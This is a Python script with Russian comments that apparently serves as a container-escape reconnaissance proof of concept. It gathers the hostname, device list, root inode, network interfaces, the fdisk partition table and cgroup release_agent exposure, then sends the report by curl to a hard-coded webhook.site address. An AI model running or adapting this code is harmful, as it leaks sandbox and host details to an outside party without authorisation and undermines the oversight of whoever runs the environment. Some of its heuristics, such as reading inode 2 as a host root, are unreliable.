import os
import subprocess
import json

WEBHOOK_URL = "https://webhook.site/12f4cc8f-b5a9-4ab3-97ca-89cb72412e87"

def get_output(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode().strip()
    except:
        return "ERR"

def check_cgroup_escape():
    # Проверка на уязвимость cgroup release_agent (классика побега)
    return os.path.exists('/sys/fs/cgroup/rdma/release_agent') or os.path.exists('/sys/fs/cgroup/memory/release_agent')

def run_advanced_poc():
    # 1. Идентификация
    report = {
        "verdict": "UNKNOWN",
        "container_id": get_output("hostname"),
        "is_privileged": False,
        "checks": {}
    }

    # 2. Проверка реальных устройств (в обычном контейнере их мало)
    devs = os.listdir('/dev')
    report["checks"]["dev_count"] = len(devs)
    if "sda" in devs or "nvme0n1" in devs:
        report["is_privileged"] = True

    # 3. Сравнение Inode корневой директории
    # В контейнере inode корня обычно отличается от inode корня хоста
    report["checks"]["root_inode"] = get_output("stat -c %i /")

    # 4. Проверка видимости сети хоста
    # Если мы видим интерфейсы вроде docker0 или eth0 с внешними IP - мы близко
    report["checks"]["ip_addr"] = get_output("ip -o addr show")

    # 5. Самый мощный тест: Попытка увидеть таблицу разделов хоста
    fdisk_data = get_output("fdisk -l")
    report["checks"]["can_see_partitions"] = "Disk /dev/" in fdisk_data

    # 6. Проверка возможности выхода через cgroups
    report["checks"]["cgroup_vulnerable"] = check_cgroup_escape()

    # Итоговый вердикт
    if report["checks"]["can_see_partitions"] or report["is_privileged"]:
        report["verdict"] = "ESCAPED_OR_PRIVILEGED"
    elif report["checks"]["root_inode"] == "2": # Inode 2 обычно у физических дисков
        report["verdict"] = "POSSIBLE_HOST_ROOT"
    else:
        report["verdict"] = "SANDBOXED"

    # Отправка
    print(f"[*] Payload generated. Verdict: {report['verdict']}")
    final_json = json.dumps(report, indent=2)
    
    subprocess.run(['curl', '-s', '-H', 'Content-Type: application/json', '-d', final_json, WEBHOOK_URL])
    return final_json

if __name__ == "__main__":
    print(run_advanced_poc())
